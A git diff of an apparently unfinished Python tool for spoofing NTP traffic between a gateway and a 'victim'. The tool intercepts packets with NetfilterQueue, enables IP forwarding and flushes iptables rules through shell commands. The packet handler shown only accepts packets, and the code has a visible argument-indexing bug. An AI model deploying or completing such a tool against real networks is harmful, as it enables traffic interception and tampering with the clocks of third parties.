@@ -21,7 +21,7 @@ Task Division:
 import os
 import sys
 from subprocess import *
-# from netfilterqueue import NetfilterQueue
+from netfilterqueue import NetfilterQueue
 from kamene.all import *
 import datetime
 from math import modf
@@ -32,8 +32,9 @@ TIME_ADJUST_FIELDS = {'year': 2017, 'month': 10}
 TIME_ASSIGN = {'year': 2018, 'month': 11, 'day': 10, 'hour': 11, 'minute': 11, 'second': 11}
 
 
-def check_ntp():  # argument is packet from netfilter queue
+def check_ntp(packet):  # argument is packet from netfilter queue
     print("check_ntp")
+    packet.accept()
     # calls modify_ntp
 
 
@@ -149,7 +150,7 @@ def main():  # no arguments
 
     gateway = sys.argv[0]
     vict = sys.argv[1]
-    package_installation()
+    #package_installation()
     os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
     os.system('iptables -F -vt raw')  # flush existing IP tables
     """
@@ -170,12 +171,13 @@ def main():  # no arguments
     """
 
     nfqueue = NetfilterQueue()
-    nfqueue.bind(99, check_ntp())
+    nfqueue.bind(99, check_ntp)
     try:
         print("Waiting for packets")
         nfqueue.run()
     except KeyboardInterrupt:
         print("Spoofing stopped")
         os.system('iptables -F -vt raw')
+        #need to change ip_forward back to 0
 
-    # main()
+main()
